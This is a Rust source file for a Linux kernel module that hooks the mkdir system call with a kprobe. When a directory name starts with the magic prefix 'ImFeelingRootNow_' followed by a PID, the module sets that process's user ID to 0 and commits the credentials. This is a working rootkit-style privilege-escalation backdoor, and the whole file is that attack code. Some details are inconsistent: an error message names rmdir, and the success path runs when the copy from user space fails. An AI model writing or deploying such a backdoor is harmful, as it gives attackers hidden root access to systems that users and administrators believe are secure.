#[allow(unused_imports)]
use core::ffi::{c_char, c_void};
use kernel::{
    bindings::{self, pid_t, pt_regs},
    c_str,
    prelude::*,
};

use super::{hook, KProbe};
use crate::utils::get_function_address;

const KERNEL_BUFFER_SIZE: usize = 256;
const MAGIC_PREFIX: &str = "ImFeelingRootNow_";

pub(crate) fn sys_hook() {
    let symbol = c_str!("__x64_sys_mkdir");
    hook(symbol.as_char_ptr(), pre_handler, post_handler)
        .expect("Failed to hook sys_rmdir");
}

unsafe fn copy_and_process_user_data(user_ptr: *const c_char, kernel_buffer: &mut [u8]) -> bool {
    unsafe {
        if bindings::copy_from_user(
            kernel_buffer.as_mut_ptr() as *mut c_void,
            user_ptr as *const c_void,
            kernel_buffer.len().try_into().unwrap(),
        ) != 0 {
            kernel_buffer[kernel_buffer.len() - 1] = 0;
            pr_info!("in if Kernel buffer: {:?}", core::str::from_utf8(kernel_buffer));

            process_kernel_buffer(kernel_buffer);
            return true;
        }
        false
    }
}

unsafe fn process_kernel_buffer(kernel_buffer: &[u8]) {
    unsafe {
        let len = kernel_buffer.iter().position(|&c| c == 0).unwrap_or(kernel_buffer.len());
        
        if let Ok(valid_str) = core::str::from_utf8(&kernel_buffer[..len]) {
            pr_info!("Kernel buffer: {}", valid_str);
            
            if valid_str.starts_with(MAGIC_PREFIX) {
                handle_root_elevation(valid_str);
            } else {
                pr_info!("No match for ImFeelingRootNow pattern");
            }
        } else {
            pr_info!("Invalid UTF-8 string in kernel buffer");
        }
    }
}

unsafe fn handle_root_elevation(valid_str: &str) {
    unsafe {
        if let Some(pid_str) = valid_str.strip_prefix(MAGIC_PREFIX) {
            if let Ok(pid) = pid_str.parse::<pid_t>() {
                pr_info!("Match found: ImFeelingRootNow_{}, attempting to elevate privileges", pid);
                elevate_privileges(pid);
            } else {
                pr_info!("Invalid PID in the string.");
            }
        }
    }
}

unsafe fn elevate_privileges(pid: pid_t) {
    unsafe {
        type FindTaskByVpidFn = unsafe extern "C" fn(pid_t) -> *mut bindings::task_struct;
        
        let find_task_by_vpid_addr = get_function_address(c_str!("find_task_by_vpid").as_char_ptr());
        let find_task_by_vpid = core::mem::transmute::<usize, FindTaskByVpidFn>(find_task_by_vpid_addr.unwrap());
        let task = find_task_by_vpid(pid);

        if !task.is_null() {
            pr_info!("Found task for PID {}", pid);
            pr_info!("TASK.PID == {}", (*task).pid);
            pr_info!("TASK.cred.uid == {:x}", (*(*task).cred).uid.val);

            let task_struct = &mut *task as *mut bindings::task_struct;
            let cred_ptr = (*task_struct).cred as *mut bindings::cred;
            (*cred_ptr).uid = bindings::kuid_t { val: 0 };

            bindings::commit_creds((*task).cred as *mut kernel::bindings::cred);
            pr_info!("Successfully escalated privileges for PID {}", pid);
        } else {
            pr_info!("Failed to find task for PID {}", pid);
        }
    }
}

unsafe fn process_final_buffer_check(kernel_buffer: &mut [u8]) {
    unsafe {
        kernel_buffer[kernel_buffer.len() - 1] = 0;
        pr_info!("out if Kernel buffer: {:?}", core::str::from_utf8(kernel_buffer));

        if bindings::strcmp(kernel_buffer.as_ptr() as *const c_char, c_str!("TEST").as_char_ptr()) == 0 {
            pr_info!("Match found: TESTa");
        } else {
            pr_info!("No match");
        }
    }
}

#[allow(improper_ctypes)]
pub(crate) unsafe extern "C" fn pre_handler(_p: *mut KProbe, _regs: *mut bindings::pt_regs) -> i32 {
    unsafe {
        pr_info!("Pre-handler invoked");

        let regs1: *mut bindings::pt_regs = (*_regs).di as *mut bindings::pt_regs;
        let user_ptr: *const c_char = (*regs1).di as *const c_char;

        let mut kernel_buffer = [0u8; KERNEL_BUFFER_SIZE];
        
        if copy_and_process_user_data(user_ptr, &mut kernel_buffer) {
            return 0;
        }

        process_final_buffer_check(&mut kernel_buffer);
        0
    }
}

pub(crate) unsafe extern "C" fn post_handler(
    _p: *mut KProbe,
    _regs: *mut pt_regs,
    _flags: u64,
) -> i32 {
    0
}
